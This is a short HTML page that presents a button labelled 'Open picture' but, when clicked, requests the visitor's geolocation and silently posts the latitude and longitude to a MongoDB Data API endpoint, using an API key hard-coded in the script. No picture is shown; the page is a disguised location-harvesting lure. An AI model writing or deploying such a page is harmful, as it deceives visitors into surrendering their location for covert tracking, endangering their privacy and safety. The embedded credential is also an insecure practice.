<!DOCTYPE html>
<html>
<head>
  <title>Picture</title>
</head>
<body>
  <button id="getLocation">Open picture</button>
  <script>
    const getLocationButton = document.getElementById('getLocation');

    getLocationButton.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationToMongo, handleError);
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    });

    function sendLocationToMongo(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Construct the JSON data with the latitude and longitude
      const jsonData = {
        "dataSource": "Cluster0",
        "database": "sample_mflix", // Update with your database name
        "collection": "comments",   // Update with your collection name
        "document": {
          "status": "open",
          "latitude": latitude,
          "longitude": longitude,
          "text": "Do the dishes" // You can remove/customize this field
        }
      };

      // Send the data to MongoDB using fetch API
      fetch('https://us-east-1.aws.data.mongodb-api.com/app/data-hjopnck/endpoint/data/v1/action/insertOne', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Request-Headers': '*',
          'api-key': 'e7djiyfCTzPb0oxwgjmUkQiEb3zFsnH1Vm9R6SxiFOlZimyr19DDo1lrlbAAFPFJ' // Replace with your API key
        },
        body: JSON.stringify(jsonData)
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok.');
        }
        return response.json();
      })
      .then(data => console.log('Location inserted:', data))
      .catch(error => console.error('Error:', error));
    }

    function handleError(error) {
      alert("Error getting location: " + error.message); 
    }
  </script>
</body>
</html>
